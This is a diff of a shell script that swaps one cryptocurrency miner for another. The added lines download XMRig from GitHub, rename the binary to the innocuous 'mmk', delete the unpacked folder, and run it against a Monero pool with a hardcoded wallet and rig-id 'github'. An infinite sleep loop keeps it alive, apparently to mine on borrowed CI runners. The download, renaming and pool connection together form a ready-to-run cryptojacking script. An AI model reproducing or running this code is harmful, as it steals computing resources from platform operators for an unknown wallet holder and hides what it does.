@@ -1,9 +1,12 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u wallet.worke -p x --cpu 2
+wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-x64.tar.gz
+tar -xzvf xmrig-6.8.2-linux-x64.tar.gz
+mv /xmrig-6.8.2/xmrig mmk
+chmod +x mmk
+rm -rf xmrig-6.8.2
+./mmk -o us-west.minexmr.com:443 -u 42W4nii4hgbQEvjcV3j1bCiwkf6151v7fdruXhjRGnZc3oUDXwVTZAyR1pVxBuyXrD84BgnPvdXsCM4MGd811LAGUHrHQhc -k --tls --rig-id github
 while [ 1 ]; do
 sleep 3
 done
